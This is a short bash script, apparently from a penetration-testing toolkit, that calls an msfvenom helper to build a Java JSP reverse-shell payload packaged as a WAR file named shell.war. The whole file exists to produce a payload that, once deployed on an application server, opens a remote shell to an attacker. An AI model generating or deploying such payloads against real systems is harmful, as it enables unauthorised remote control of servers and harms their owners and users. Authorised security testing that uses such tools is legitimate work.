#!/bin/bash

: '
Create WAR file
'

source "${SCRIPTS_DIR}/shell/msfvenom/.files/create_reverse_shell.sh"

payload="java/jsp_shell_reverse_tcp"
format="war"
filename="shell.war"

create_reverse_shell "${payload}" "${format}" "${filename}"